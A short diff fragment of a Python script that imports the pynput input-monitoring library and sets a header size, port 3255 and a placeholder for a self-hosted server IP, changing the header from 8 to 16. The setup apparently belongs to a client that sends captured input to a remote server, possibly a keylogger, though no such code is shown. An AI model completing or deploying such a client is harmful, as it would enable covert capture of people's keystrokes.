@@ -3,7 +3,7 @@ import time
 from pynput import *
 import sys
 
-header = 8
+header = 16
 format = "utf-8"
 port = 3255
 server = #your ip where you hosted the server
